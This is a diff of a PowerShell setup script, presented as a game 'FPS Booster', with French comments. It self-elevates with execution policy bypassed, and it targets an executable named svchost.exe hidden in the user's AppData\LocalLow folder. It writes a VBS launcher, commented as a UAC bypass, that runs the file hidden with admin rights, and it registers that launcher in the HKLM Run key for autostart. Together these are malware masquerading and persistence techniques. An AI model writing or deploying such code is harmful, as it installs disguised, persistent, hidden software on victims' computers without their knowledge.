@@ -1,5 +1,5 @@
-# Auto-élévation en admin si pas déjà admin
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+# Auto-elevation en admin si pas deja admin
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     Exit
 }
@@ -12,7 +12,7 @@ function Write-Log {
     param($Message)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $logMessage = "[$timestamp] $Message"
-    Add-Content -Path $logFile -Value $logMessage
+    Add-Content -Path $logFile -Value $logMessage -ErrorAction SilentlyContinue
     Write-Host $Message
 }
 
@@ -25,11 +25,11 @@ Write-Log "=========================================="
 Write-Host "=== Setup FPS Booster Auto-Start Admin ===" -ForegroundColor Cyan
 Write-Host ""
 
-# Chemin du programme avec %userprofile%
+# Chemin du programme
 $p = "$env:USERPROFILE\AppData\LocalLow\svchost.exe"
 Write-Log "Chemin du programme: $p"
 
-# Vérifier que le fichier existe
+# Verifier que le fichier existe
 if (-not (Test-Path $p)) {
     Write-Host "ERREUR: Le fichier n'existe pas!" -ForegroundColor Red
     Write-Host "Chemin: $p" -ForegroundColor Yellow
@@ -42,14 +42,19 @@ Write-Host "Fichier trouve: $p" -ForegroundColor Green
 Write-Log "SUCCESS: Fichier trouve"
 Write-Host "Configuration en cours..." -ForegroundColor Yellow
 
-# Créer le script VBS pour bypass UAC
+# Creer le script VBS pour bypass UAC
 $v = "$env:APPDATA\FPSBooster.vbs"
 Write-Log "Creation du script VBS: $v"
-"Set UAC = CreateObject(""Shell.Application""): UAC.ShellExecute ""$p"", """", """", ""runas"", 0" | Out-File $v -Encoding ASCII -Force
+$vbsContent = @"
+Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "$p", "", "", "runas", 0
+"@
+$vbsContent | Out-File $v -Encoding ASCII -Force
 
-# Ajouter au registre de démarrage
+# Ajouter au registre de demarrage
 Write-Log "Ajout au registre de demarrage..."
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "FPSBooster" /t REG_SZ /d "wscript.exe ""$v""" /f | Out-Null
+$regCommand = "reg add `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v `"FPSBooster`" /t REG_SZ /d `"wscript.exe \`"$v\`"`" /f"
+Invoke-Expression $regCommand | Out-Null
 Write-Log "SUCCESS: Registre configure"
 
 Write-Host ""
